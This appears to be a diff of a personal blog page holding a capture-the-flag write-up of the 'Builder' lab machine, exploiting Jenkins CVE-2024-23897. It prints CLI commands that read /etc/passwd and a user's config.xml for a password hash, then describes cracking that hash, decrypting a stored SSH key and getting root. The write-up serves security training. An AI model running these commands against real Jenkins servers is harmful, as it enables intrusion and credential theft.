20%20%20%20Stop%20all%20running%20builds%20for%20job%28s%29%0a%20%20update-credentials-by-xml%0a%20%20%20%20Update%20Credentials%20by%20XML%0a%20%20update-credentials-domain-by-xml%0a%20%20%20%20Update%20Credentials%20Domain%20by%20XML%0a%20%20update-job%0a%20%20%20%20Updates%20the%20job%20definition%20XML%20from%20stdin.%20The%20opposite%20of%20the%20get-job%20command.%0a%20%20update-node%0a%20%20%20%20Updates%20the%20node%20definition%20XML%20from%20stdin.%20The%20opposite%20of%20the%20get-node%20command.%0a%20%20update-view%0a%20%20%20%20Updates%20the%20view%20definition%20XML%20from%20stdin.%20The%20opposite%20of%20the%20get-view%20command.%0a%20%20version%0a%20%20%20%20Outputs%20the%20current%20version.%0a%20%20wait-node-offline%0a%20%20%20%20Wait%20for%20a%20node%20to%20become%20offline.%0a%20%20wait-node-online%0a%20%20%20%20Wait%20for%20a%20node%20to%20become%20online.%0a%20%20who-am-i%0a%20%20%20%20Reports%20your%20credential%20and%20permissions.%0a%0aERROR:%20No%20such%20command%20kali.%20Available%20commands%20are%20above.%20">
-<i class="bi bi-copy"></i></button></div><pre><code>──(kali㉿kali)-[~/Desktop/builder]
+<a href="https://en.wikipedia.org/wiki/Jetty_(web_server)">https://en.wikipedia.org/wiki/Jetty_(web_server)</a></p>
+<p><img src="https://dl.dropbox.com/scl/fi/qzn7ovjxvi2m4f7ckvqy6/Pasted-image-20240331113836.png?rlkey=wiyj2n6iktk9f4dyprurz38mo&amp;st=96j6qqzs&amp;dl=0" alt="builder 2"></p>
+<p>Here&rsquo;s the jenikins dashboard and jenikins version is 2.441</p>
+<p>in the people tab we have a user called jennifer</p>
+<p>enkins is a Java application. The server is Jetty, a Java web server.</p>
+<p>I’m going to skip the directory brute force given that I know exactly what this application is.</p>
+<p>After a bit of searching i finally fund the vuln for 2.441 version</p>
+<p><a href="https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2024-23897?source=post_page-----143ad7fde347--------------------------------">https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2024-23897?source=post_page-----143ad7fde347--------------------------------</a></p>
+<p><img src="https://dl.dropbox.com/scl/fi/76505wvjdloqlmmh33wjj/Pasted-image-20240331114637.png?rlkey=4oayeovwlzjj2it0rph9mgg8s&amp;st=udj0q62f&amp;dl=0" alt="builder 3"></p>
+<p>from the above information, The <code>jenkins-cli.jar</code> file is a Java archive file that contains the Jenkins CLI utility. This utility allows users to interact with Jenkins from the command line or from scripts.</p>
+<p>for more information about jenikins cli refer to the documentation
+<a href="https://www.jenkins.io/doc/book/managing/cli/#downloading-the-client">https://www.jenkins.io/doc/book/managing/cli/#downloading-the-client</a></p>
+<p>Jenkins CLI allows users to reference a file path using the syntax @[filepath], and Jenkins will replace it with the contents of the referenced file.</p>
+<ol>
+<li>
+<p><strong>User Input</strong>: When using the Jenkins CLI, a user might input a command or script that includes references to files using the @[filepath] syntax. For example:</p>
+<p>bashCopy code</p>
+<p><code>jenkins-cli command @[path/to/file]</code></p>
+</li>
+<li>
+<p><strong>Interpretation</strong>: Jenkins CLI interprets this syntax as a directive to read the contents of the specified file.</p>
+</li>
+<li>
+<p><strong>File Read Operation</strong>: Jenkins CLI then performs a file read operation, reading the contents of the specified file referenced in the command.</p>
+</li>
+<li>
+<p><strong>Replacement</strong>: After reading the file contents, Jenkins replaces the @[filepath] syntax in the command/script with the actual contents of the file.</p>
+</li>
+<li>
+<p><strong>Command Execution</strong>: Finally, Jenkins executes the modified command or script with the replaced file contents.</p>
+</li>
+</ol>
+<p>i downloaded the jenikins cli using the wget command</p>
+<p><img src="https://dl.dropbox.com/scl/fi/nvq9612rw82nwr8arjh7l/Pasted-image-20240331121014.png?rlkey=k55tyn5y60yq0uszjos3eiit5&amp;st=gzb15ifm&amp;dl=0" alt="builder 4"></p>
+<p>the command java -jar jenikind-cli.jar -s &lsquo;ip:port&rsquo; help to give the list of all the commands</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="%e2%94%80%e2%94%80%28kali%e3%89%bfkali%29-[~/Desktop/builder]%0a%e2%94%94%e2%94%80$%20java%20-jar%20jenkins-cli.jar%20-s%20%27http://10.129.230.169:8080%27%20help%20kali%0aPicked%20up%20_JAVA_OPTIONS:%20-Dawt.useSystemAAFontSettings=on%20-Dswing.aatext=true%0a%20%20add-job-to-view%0a%20%20%20%20Adds%20jobs%20to%20view.%0a%20%20build%0a%20%20%20%20Builds%20a%20job,%20and%20optionally%20waits%20until%20its%20completion.%0a%20%20cancel-quiet-down%0a%20%20%20%20Cancel%20the%20effect%20of%20the%20%22quiet-down%22%20command.%0a%20%20clear-queue%0a%20%20%20%20Clears%20the%20build%20queue.%0a%20%20connect-node%0a%20%20%20%20Reconnect%20to%20a%20node%28s%29%0a%20%20console%0a%20%20%20%20Retrieves%20console%20output%20of%20a%20build.%0a%20%20copy-job%0a%20%20%20%20Copies%20a%20job.%0a%20%20create-credentials-by-xml%0a%20%20%20%20Create%20Credential%20by%20XML%0a%20%20create-credentials-domain-by-xml%0a%20%20%20%20Create%20Credentials%20Domain%20by%20XML%0a%20%20create-job%0a%20%20%20%20Creates%20a%20new%20job%20by%20reading%20stdin%20as%20a%20configuration%20XML%20file.%0a%20%20create-node%0a%20%20%20%20Creates%20a%20new%20node%20by%20reading%20stdin%20as%20a%20XML%20configuration.%0a%20%20create-view%0a%20%20%20%20Creates%20a%20new%20view%20by%20reading%20stdin%20as%20a%20XML%20configuration.%0a%20%20declarative-linter%0a%20%20%20%20Validate%20a%20Jenkinsfile%20containing%20a%20Declarative%20Pipeline%0a%20%20delete-builds%0a%20%20%20%20Deletes%20build%20record%28s%29.%0a%20%20delete-credentials%0a%20%20%20%20Delete%20a%20Credential%0a%20%20delete-credentials-domain%0a%20%20%20%20Delete%20a%20Credentials%20Domain%0a%20%20delete-job%0a%20%20%20%20Deletes%20job%28s%29.%0a%20%20delete-node%0a%20%20%20%20Deletes%20node%28s%29%0a%20%20delete-view%0a%20%20%20%20Deletes%20view%28s%29.%0a%20%20disable-job%0a%20%20%20%20Disables%20a%20job.%0a%20%20disable-plugin%0a%20%20%20%20Disable%20one%20or%20more%20installed%20plugins.%0a%20%20disconnect-node%0a%20%20%20%20Disconnects%20from%20a%20node.%0a%20%20enable-job%0a%20%20%20%20Enables%20a%20job.%0a%20%20enable-plugin%0a%20%20%20%20Enables%20one%20or%20more%20installed%20plugins%20transitively.%0a%20%20get-credentials-as-xml%0a%20%20%20%20Get%20a%20Credentials%20as%20XML%20%28secrets%20redacted%29%0a%20%20get-credentials-domain-as-xml%0a%20%20%20%20Get%20a%20Credentials%20Domain%20as%20XML%0a%20%20get-job%0a%20%20%20%20Dumps%20the%20job%20definition%20XML%20to%20stdout.%0a%20%20get-node%0a%20%20%20%20Dumps%20the%20node%20definition%20XML%20to%20stdout.%0a%20%20get-view%0a%20%20%20%20Dumps%20the%20view%20definition%20XML%20to%20stdout.%0a%20%20groovy%0a%20%20%20%20Executes%20the%20specified%20Groovy%20script.%20%0a%20%20groovysh%0a%20%20%20%20Runs%20an%20interactive%20groovy%20shell.%0a%20%20help%0a%20%20%20%20Lists%20all%20the%20available%20commands%20or%20a%20detailed%20description%20of%20single%20command.%0a%20%20import-credentials-as-xml%0a%20%20%20%20Import%20credentials%20as%20XML.%20The%20output%20of%20%22list-credentials-as-xml%22%20can%20be%20used%20as%20input%20here%20as%20is,%20the%20only%20needed%20change%20is%20to%20set%20the%20actual%20Secrets%20which%20are%20redacted%20in%20the%20output.%0a%20%20install-plugin%0a%20%20%20%20Installs%20a%20plugin%20either%20from%20a%20file,%20an%20URL,%20or%20from%20update%20center.%20%0a%20%20keep-build%0a%20%20%20%20Mark%20the%20build%20to%20keep%20the%20build%20forever.%0a%20%20list-changes%0a%20%20%20%20Dumps%20the%20changelog%20for%20the%20specified%20build%28s%29.%0a%20%20list-credentials%0a%20%20%20%20Lists%20the%20Credentials%20in%20a%20specific%20Store%0a%20%20list-credentials-as-xml%0a%20%20%20%20Export%20credentials%20as%20XML.%20The%20output%20of%20this%20command%20can%20be%20used%20as%20input%20for%20%22import-credentials-as-xml%22%20as%20is,%20the%20only%20needed%20change%20is%20to%20set%20the%20actual%20Secrets%20which%20are%20redacted%20in%20the%20output.%0a%20%20list-credentials-context-resolvers%0a%20%20%20%20List%20Credentials%20Context%20Resolvers%0a%20%20list-credentials-providers%0a%20%20%20%20List%20Credentials%20Providers%0a%20%20list-jobs%0a%20%20%20%20Lists%20all%20jobs%20in%20a%20specific%20view%20or%20item%20group.%0a%20%20list-plugins%0a%20%20%20%20Outputs%20a%20list%20of%20installed%20plugins.%0a%20%20mail%0a%20%20%20%20Reads%20stdin%20and%20sends%20that%20out%20as%20an%20e-mail.%0a%20%20offline-node%0a%20%20%20%20Stop%20using%20a%20node%20for%20performing%20builds%20temporarily,%20until%20the%20next%20%22online-node%22%20command.%0a%20%20online-node%0a%20%20%20%20Resume%20using%20a%20node%20for%20performing%20builds,%20to%20cancel%20out%20the%20earlier%20%22offline-node%22%20command.%0a%20%20quiet-down%0a%20%20%20%20Quiet%20down%20Jenkins,%20in%20preparation%20for%20a%20restart.%20Don%e2%80%99t%20start%20any%20builds.%0a%20%20reload-configuration%0a%20%20%20%20Discard%20all%20the%20loaded%20data%20in%20memory%20and%20reload%20everything%20from%20file%20system.%20Useful%20when%20you%20modified%20config%20files%20directly%20on%20disk.%0a%20%20reload-job%0a%20%20%20%20Reload%20job%28s%29%0a%20%20remove-job-from-view%0a%20%20%20%20Removes%20jobs%20from%20view.%0a%20%20replay-pipeline%0a%20%20%20%20Replay%20a%20Pipeline%20build%20with%20edited%20script%20taken%20from%20standard%20input%0a%20%20restart%0a%20%20%20%20Restart%20Jenkins.%0a%20%20restart-from-stage%0a%20%20%20%20Restart%20a%20completed%20Declarative%20Pipeline%20build%20from%20a%20given%20stage.%0a%20%20safe-restart%0a%20%20%20%20Safe%20Restart%20Jenkins.%20Don%e2%80%99t%20start%20any%20builds.%0a%20%20safe-shutdown%0a%20%20%20%20Puts%20Jenkins%20into%20the%20quiet%20mode,%20wait%20for%20existing%20builds%20to%20be%20completed,%20and%20then%20shut%20down%20Jenkins.%0a%20%20session-id%0a%20%20%20%20Outputs%20the%20session%20ID,%20which%20changes%20every%20time%20Jenkins%20restarts.%0a%20%20set-build-description%0a%20%20%20%20Sets%20the%20description%20of%20a%20build.%0a%20%20set-build-display-name%0a%20%20%20%20Sets%20the%20displayName%20of%20a%20build.%0a%20%20shutdown%0a%20%20%20%20Immediately%20shuts%20down%20Jenkins%20server.%0a%20%20stop-builds%0a%20%20%20%20Stop%20all%20running%20builds%20for%20job%28s%29%0a%20%20update-credentials-by-xml%0a%20%20%20%20Update%20Credentials%20by%20XML%0a%20%20update-credentials-domain-by-xml%0a%20%20%20%20Update%20Credentials%20Domain%20by%20XML%0a%20%20update-job%0a%20%20%20%20Updates%20the%20job%20definition%20XML%20from%20stdin.%20The%20opposite%20of%20the%20get-job%20command.%0a%20%20update-node%0a%20%20%20%20Updates%20the%20node%20definition%20XML%20from%20stdin.%20The%20opposite%20of%20the%20get-node%20command.%0a%20%20update-view%0a%20%20%20%20Updates%20the%20view%20definition%20XML%20from%20stdin.%20The%20opposite%20of%20the%20get-view%20command.%0a%20%20version%0a%20%20%20%20Outputs%20the%20current%20version.%0a%20%20wait-node-offline%0a%20%20%20%20Wait%20for%20a%20node%20to%20become%20offline.%0a%20%20wait-node-online%0a%20%20%20%20Wait%20for%20a%20node%20to%20become%20online.%0a%20%20who-am-i%0a%20%20%20%20Reports%20your%20credential%20and%20permissions.%0a%0aERROR:%20No%20such%20command%20kali.%20Available%20commands%20are%20above.%20">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <pre><code>──(kali㉿kali)-[~/Desktop/builder]
 └─$ java -jar jenkins-cli.jar -s &#39;http://10.129.230.169:8080&#39; help kali
 Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
   add-job-to-view
@@ -161,15 +908,282 @@ Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
   who-am-i
     Reports your credential and permissions.
 
-ERROR: No such command kali. Available commands are above. </code></pre></div><p>The above are the list of commands we can execute in jenikins CLI</p><p>i executed whoami cmd here
-<img src="https://drive.google.com/file/d/1jv4_9KluCgGVaW0dLsFaPgUT0LqWePPc/view?usp=sharing" alt></p><p><img src="https://drive.google.com/file/d/1NBFBfgctUkCBiE31cCSS1Uq73ghkt-w4/view?usp=sharing" alt></p><p><code>'@/etc/passwd'</code>: This part of the command is specifying a file path, <code>'/etc/passwd'</code>, using the syntax <code>@filepath</code></p><p><img src="https://drive.google.com/file/d/15HIduZ4n5wmkyfaLPUVT0ZS6nfuY8QS6/view?usp=sharing" alt></p><p>We found the hostname by reading /etc/hostname file
-The hostname is “0f52c222a4cc”.</p><p>I googled where Jenkins user files are stored</p><p><img src="https://drive.google.com/file/d/1SzcKcF3bXmAtTAQLDs_vkRwwMMZYDm8I/view?usp=sharing" alt></p><p>so modified the code and tried to read the user.txt file and got the user flag</p><p><img src="https://drive.google.com/file/d/1tdbdYFWndeBqCkkeXb2XIcGhJBsr6rJ7/view?usp=drive_link" alt></p><p>Jenkins <a href=https://dev.to/pencillr/spawn-a-jenkins-from-code-gfa>stores information</a> about its user accounts in <code>/var/jenkins_home/users/users.xml</code>. Using <code>reload-node</code>, I’ll get the lines of that file, albeit a bit scrambed:</p><p><img src="https://drive.google.com/file/d/1brUEvNb_LYCPYFcHFIkvMKlRcVrQ2x3b/view?usp=sharing" alt></p><p>with this command i got the jennifier id with this i tried to view config file of jenifer</p><p>java -jar jenkins-cli.jar -s &lsquo;http://10.129.230.169:8080&rsquo; reload-job &lsquo;@/var/jenkins_home/users/jennifer_12108429903186576833/config.xml&rsquo;</p><p>the output is very clumsy but in the end i found a password hash shown below</p><p><img src="https://drive.google.com/file/d/16AiGH4lZ4fAGcVynH_ImP-vXDkQi5hZl/view?usp=sharing" alt>
-<img src="https://drive.google.com/file/d/1DI5g2hR0DIdhqImnxwvaHzU9WBgG7VYx/view?usp=sharing" alt></p><p>There&rsquo;s another way to get this password hash using Python code proof-of-concept (PoC) for exploiting a vulnerability in Jenkins servers that allows arbitrary file read through the Jenkins CLI.
-where i&rsquo;ve mentioned below <a href=#Python%20POCs>Python POCs</a></p><p>I used JTR to crack the password in the config.xml he format is specified as bcrypt so i specified format to get the result faster</p><p>and then with the username jennifer and password princess i logged into the jenikins and here&rsquo;s the view of global credentials management</p><p>earlier we are unable to open this beacuse we aren&rsquo;t logged in as jennifer
-<img src="https://drive.google.com/file/d/1m53loNOdCSeSjUXPQZAKoK99BicbNgOT/view?usp=sharing" alt></p><p>if you inspect the value you will find private key in commented sections</p><p><img src="https://drive.google.com/file/d/1OSM5b5TgDVHOhWr6cD7ne0jMe7555mhy/view?usp=sharing" alt></p><p>we found the private key but it&rsquo;s encrypted so i googled how to decrypt Jenkins private key or secret key and it led me to this</p><p><img src="https://drive.google.com/file/d/10bogPnVJJvfYkqXI1wDSSafGhTojUEKl/view?usp=sharing" alt></p><p>In the script console under manage jenkins i&rsquo;v epasted this script i found in stack exchange and got the ssh key
-<img src="https://drive.google.com/file/d/1TQw-l06NCeXBzCK5i9UeL3cRykmrJowc/view?usp=sharing" alt></p><p>so i stored the key and accessd ssh i got the shell login but for everything i do i&rsquo;m getting permission denied as below</p><p><img src="https://drive.google.com/file/d/1QUp955GyWt5PRSdxnOfbIVXGxvisEDQa/view?usp=sharing" alt></p><p><img src="https://drive.google.com/file/d/1k2idp5-h7I5yorBQD141JeK5OPdeOzKN/view?usp=sharing" alt></p><p>so i gave the root permissions to the ssh file and logged in again and i got the root access as below</p><p><img src="https://drive.google.com/file/d/11Y5PghSKZkubpk80suRx_cC0psYan5PY/view?usp=sharing" alt></p><p>cat root.txt gave me the root flag</p><p><img src="https://drive.google.com/file/d/1v-CJ2dmA3zoRRTHmg1PG2hvU6ZEz-aSw/view?usp=sharing" alt></p><h4 id=python-pocs>Python POCs</h4><p>There are Python POCs out there on GitHub that will do a similar thing. They don’t really add anything over the JAR file, so I prefer that method. They do work to make similar output:</p><p>for reference : <a href="https://www.youtube.com/watch?v=toPJhfy-wvw&amp;t=84s">https://www.youtube.com/watch?v=toPJhfy-wvw&amp;t=84s</a></p><p><a href=https://github.com/binganao/CVE-2024-23897/tree/main>https://github.com/binganao/CVE-2024-23897/tree/main</a></p><p>this code exploits a vulnerability in Jenkins CLI by crafting a malicious payload that triggers arbitrary file read (<code>/etc/passwd</code> in this case) through the Jenkins server. It sends specially crafted HTTP requests to the server to exploit this vulnerability.
-usuage :</p><div class=codeblock><div class=copy-button-box><button class=copy-button state=copy data=#ZgotmplZ>
-<i class="bi bi-copy"></i></button></div><pre><code>python poc.py
-[*] usage: python poc.py http://127.0.0.1:8888/ [/etc/passwd]</code></pre></div></div></article></main><footer class=footer><div class=footer-left><ul class=social><li>All Rights Reserved ®.</li><li>Santhosh Vardan</li><li><a href=mailto:santoshvardan007@gmail.com target=_blank><i class=bi-envelope></i></a></li><li><a href=https://github.com/darkrider00 target=_blank><i class=bi-github></i></a></li><li><a href=https://www.linkedin.com/in/perplex007/ target=_blank><i class=bi-linkedin></i></a></li><li><a href=https://t.me/the_last_uzumaki_0 target=_blank><i class=bi-telegram></i></a></li><li><a href=https://x.com/perplex_007 target=_blank><i class=bi-twitter></i></a></li></ul></div><div class=footer-right><ul class="control status clearfix"><li>Word Count:
-1367</li><li>en</li><li><a href=https://gohugo.io class=btn target=_blank>Hugo: 0.127.0</a></li><li><a href=https://github.com/JingWangTW/dark-theme-editor class=btn target=_blank>Theme: dark-theme-editor</a></li><li>Last modified: &nbsp;
-<time>Jul 19 2024 14:25:40</time></li><li title></li></ul></div></footer></body><script type=text/javascript src=/js/index_d751713.min.5eeb120f16ea146352725c420364f87befead45f678142b8f0ffbef024646931fbc06bff07a7bd6cb57fa2f8cd8a21ba6a4ee5a278ec32303a378bc1cd17f246.js integrity="sha512-XusSDxbqFGNSclxCA2T4e+/q1F9ngUK48P++8CRkaTH7wGv/B6e9bLV/ovjNiiG6ak7lonjsMjA6N4vBzRfyRg=="></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css></html>
+ERROR: No such command kali. Available commands are above. </code></pre>
+    
+</div>
+<p>The above are the list of commands we can execute in jenikins CLI</p>
+<p>i executed whoami cmd here</p>
+<p><img src="https://dl.dropbox.com/scl/fi/q3g3urkz3qlnzwlierdoa/Pasted-image-20240331121429.png?rlkey=vv8x3to1jia0ukrdp7ubixwvr&amp;st=3igyer7w&amp;dl=0" alt="builder 5"></p>
+<p><img src="https://dl.dropbox.com/scl/fi/s4rqdqed0xivmx33ye4yp/Pasted-image-20240331122025.png?rlkey=12lw9qnqw6e4nxc9ou6rbwwd8&amp;st=n9xee0xs&amp;dl=0" alt="builder 6"></p>
+<p><code>'@/etc/passwd'</code>: This part of the command is specifying a file path, <code>'/etc/passwd'</code>, using the syntax <code>@filepath</code></p>
+<p><img src="https://dl.dropbox.com/scl/fi/250rh8ynd7wa0uw8glbs2/Pasted-image-20240331122250.png?rlkey=bxeeo0dveaik8uo98ujwkpt4c&amp;st=lknji9iw&amp;dl=0" alt="builder 7"></p>
+<p>We found the hostname by reading /etc/hostname file
+The hostname is “0f52c222a4cc”.</p>
+<p>I googled where Jenkins user files are stored</p>
+<p><img src="https://dl.dropbox.com/scl/fi/l9fzmfmtrdox0h6ziw4xu/Pasted-image-20240331140629.png?rlkey=nid39ny7okgynp0p8bve2o825&amp;st=yng7pwwi&amp;dl=0" alt="builder 8"></p>
+<p>so modified the code and tried to read the user.txt file and got the user flag</p>
+<p><img src="https://dl.dropbox.com/scl/fi/u0rfyktg4k5yw10x7crlv/Pasted-image-20240331142430.png?rlkey=z02etfvrxcq9tx4i4x31sp7b3&amp;st=u30gts6t&amp;dl=0" alt="builder 9"></p>
+<p>Jenkins <a href="https://dev.to/pencillr/spawn-a-jenkins-from-code-gfa">stores information</a> about its user accounts in <code>/var/jenkins_home/users/users.xml</code>. Using <code>reload-node</code>, I’ll get the lines of that file, albeit a bit scrambed:</p>
+<p><img src="https://dl.dropbox.com/scl/fi/tscw0ss6pjii8dqdywiu6/Pasted-image-20240331141106.png?rlkey=344bc2obwuikq23i01gjdkeym&amp;st=k9jyzzua&amp;dl=0" alt="builder 10"></p>
+<p>with this command i got the jennifier id with this i tried to view config file of jenifer</p>
+<p>java -jar jenkins-cli.jar -s &lsquo;http://10.129.230.169:8080&rsquo; reload-job &lsquo;@/var/jenkins_home/users/jennifer_12108429903186576833/config.xml&rsquo;</p>
+<p>the output is very clumsy but in the end i found a password hash shown below</p>
+<p><img src="https://dl.dropbox.com/scl/fi/7ik40pduoknse9hjpzsjk/Pasted-image-20240331134945.png?rlkey=u0poptfpbvhuboxdtwq26a5qw&amp;st=z458acg5&amp;dl=0" alt="builder 11"></p>
+<p><img src="https://dl.dropbox.com/scl/fi/qqxosxa0p3rqq7uyiwfnu/Pasted-image-20240331135036.png?rlkey=xlz87d97tzbl1jb2lrzwvoq4e&amp;st=8us0y2lb&amp;dl=0" alt=""></p>
+<p>There&rsquo;s another way to get this password hash using Python code proof-of-concept (PoC) for exploiting a vulnerability in Jenkins servers that allows arbitrary file read through the Jenkins CLI.
+where i&rsquo;ve mentioned below <a href="#Python%20POCs">Python POCs</a></p>
+<p>I used JTR to crack the password in the config.xml he format is specified as bcrypt so i specified format to get the result faster</p>
+<p>and then with the username jennifer and password princess i logged into the jenikins and here&rsquo;s the view of global credentials management</p>
+<p>earlier we are unable to open this beacuse we aren&rsquo;t logged in as jennifer</p>
+<p><img src="https://dl.dropbox.com/scl/fi/z3chpo65pp6xcncjx87dq/Pasted-image-20240331135419.png?rlkey=if0bimue23yvw66hrnw9de4t1&amp;st=hf2a2u1q&amp;dl=0" alt="builder 12"></p>
+<p>if you inspect the value you will find private key in commented sections</p>
+<p><img src="https://dl.dropbox.com/scl/fi/toqbwv5ban14w1m8uynku/Pasted-image-20240331132427.png?rlkey=zi9dir3yjx6tjmpmw364ake4i&amp;st=bbmlzopd&amp;dl=0" alt="builder 13"></p>
+<p>we found the private key but it&rsquo;s encrypted so i googled how to decrypt Jenkins private key or secret key and it led me to this</p>
+<p><img src="https://dl.dropbox.com/scl/fi/a2y3s2tfhlyw74krfbj5j/Pasted-image-20240331133823.png?rlkey=msg2j5z64q18ysw81q3tmq5s1&amp;st=2jysoh8f&amp;dl=0" alt="builder 14"></p>
+<p>In the script console under manage jenkins i&rsquo;v epasted this script i found in stack exchange and got the ssh key</p>
+<p><img src="https://dl.dropbox.com/scl/fi/wfvou65zmh6nknlim1j1t/Pasted-image-20240331140116.png?rlkey=9n888kpnqtxej7dwn42enrhhq&amp;st=hn3fzmfq&amp;dl=0" alt="builder 15"></p>
+<p>so i stored the key and accessd ssh i got the shell login but for everything i do i&rsquo;m getting permission denied as below</p>
+<p><img src="https://dl.dropbox.com/scl/fi/ka4frpdm2hev6x03l7frh/Pasted-image-20240331134218.png?rlkey=3nfuqk59uz5f0xi515fr4rbsm&amp;st=ob3z5142&amp;dl=0" alt="builder 16"></p>
+<p><img src="https://dl.dropbox.com/scl/fi/0v8oowo5bozhntnan4nv5/Pasted-image-20240331134254.png?rlkey=v291ahpy6lzdzre6qnj3i68ex&amp;st=ztkpoyhs&amp;dl=0" alt="builder 17"></p>
+<p>so i gave the root permissions to the ssh file and logged in again and i got the root access as below</p>
+<p><img src="https://dl.dropbox.com/scl/fi/7hylzkg2f32zkqs23su6e/Pasted-image-20240331134319.png?rlkey=2pyvhucuvm9pqm1hp2ad4xtl4&amp;st=hl5j70y9&amp;dl=0" alt="builder 18"></p>
+<p>cat root.txt gave me the root flag</p>
+<p><img src="https://dl.dropbox.com/scl/fi/bbdi6cqogdudrcpk77ksp/Pasted-image-20240331134642.png?rlkey=oiay33ownyq2vkwtz4x13b1gt&amp;st=9ppe98hn&amp;dl=0" alt="builder 19"></p>
+<h4 id="python-pocs">Python POCs</h4>
+<p>There are Python POCs out there on GitHub that will do a similar thing. They don’t really add anything over the JAR file, so I prefer that method. They do work to make similar output:</p>
+<p>for reference : <a href="https://www.youtube.com/watch?v=toPJhfy-wvw&amp;t=84s">https://www.youtube.com/watch?v=toPJhfy-wvw&amp;t=84s</a></p>
+<p><a href="https://github.com/binganao/CVE-2024-23897/tree/main">https://github.com/binganao/CVE-2024-23897/tree/main</a></p>
+<p>this code exploits a vulnerability in Jenkins CLI by crafting a malicious payload that triggers arbitrary file read (<code>/etc/passwd</code> in this case) through the Jenkins server. It sends specially crafted HTTP requests to the server to exploit this vulnerability.
+usuage :</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <pre><code>python poc.py
+[*] usage: python poc.py http://127.0.0.1:8888/ [/etc/passwd]</code></pre>
+    
+</div>
+
+            
+        </div>
+    </article>
+
+        </main>
+
+        <footer class="footer">
+    <div class="footer-left">
+        <ul class="social">
+            
+                <li>All Rights Reserved ®.</li>
+            
+
+            
+                <li>Santhosh Vardan</li>
+            
+
+            
+                
+                    <li>
+                        
+                            <a href="mailto:santoshvardan007@gmail.com" target="_blank">
+                                <i class="bi-envelope"></i>
+                            </a>
+                        
+
+                    </li>
+                
+            
+                
+            
+                
+                    <li>
+                        
+                            <a href="https://github.com/darkrider00" target="_blank">
+                                <i class="bi-github"></i>
+                            </a>
+                        
+
+                    </li>
+                
+            
+                
+            
+                
+                    <li>
+                        
+                            <a href="https://www.linkedin.com/in/perplex007/" target="_blank">
+                                <i class="bi-linkedin"></i>
+                            </a>
+                        
+
+                    </li>
+                
+            
+                
+            
+                
+                    <li>
+                        
+                            <a href="https://t.me/the_last_uzumaki_0" target="_blank">
+                                <i class="bi-telegram"></i>
+                            </a>
+                        
+
+                    </li>
+                
+            
+                
+                    <li>
+                        
+                            <a href="https://x.com/perplex_007" target="_blank">
+                                <i class="bi-twitter"></i>
+                            </a>
+                        
+
+                    </li>
+                
+            
+                
+            
+                
+            
+        </ul>
+    </div>
+
+    <div class="footer-right">
+        <ul class="control status clearfix">
+            
+                <li>
+                    
+                        Word Count:
+                        1367
+                    
+                </li>
+            
+
+            
+            
+
+            
+                <li>en</li>
+            
+
+            
+                <li>
+                    <a href="https://gohugo.io" class="btn" target="_blank"
+                        >Hugo: 0.127.0</a
+                    >
+                </li>
+            
+
+            
+                <li>
+                    <a
+                        href="https://github.com/JingWangTW/dark-theme-editor"
+                        class="btn"
+                        target="_blank"
+                        >Theme: dark-theme-editor</a
+                    >
+                </li>
+            
+
+            
+                <li>
+                    
+                        Last modified: &nbsp;
+                        <time>
+                            Jul 19 2024 14:25:40
+                        </time>
+                    
+                </li>
+            
+
+            
+                <li title="">
+                    
+                </li>
+            
+        </ul>
+    </div>
+</footer>
+
+    </body>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/codeblock_copy.2e8ec6d1c2acd298acca044dd90a3e6c550bfe467768a22d8ce69c30cefdf813e1f2bdf31939c94542b977db46bdc0e844c807779972408d8a58df29657a635b.js"
+            integrity="sha512-Lo7G0cKs0pisygRN2Qo&#43;bFUL/kZ3aKItjOacMM79&#43;BPh8r3zGTnJRUK5d9tGvcDoRMgHd5lyQI2KWN8pZXpjWw=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/dir_toggle.35e8f79b370b43fa56a12e33f2a6498fdd571d6d857796df2ade4bf9af6a2d6b274fcc3846de6aa679a12d2e9cce53330ee1eeec121bc40d0a42d98b2b413b8f.js"
+            integrity="sha512-Nej3mzcLQ/pWoS4z8qZJj91XHW2Fd5bfKt5L&#43;a9qLWsnT8w4Rt5qpnmhLS6czlMzDuHu7BIbxA0KQtmLK0E7jw=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/sidebar.c85fe41e1d2b187f402cf6abbc0273c6c8b0767b0d20dec7ca6134a4dc3e01a4bc8a9bcee30203dea8546be9fdbd73d53e09aa8908f54a44429ca324e81905da.js"
+            integrity="sha512-yF/kHh0rGH9ALParvAJzxsiwdnsNIN7HymE0pNw&#43;AaS8ipvO4wID3qhUa&#43;n9vXPVPgmqiQj1SkRCnKMk6BkF2g=="></script>
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link
+    rel="stylesheet"
+    href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" />
+
+
+
+
+</html>
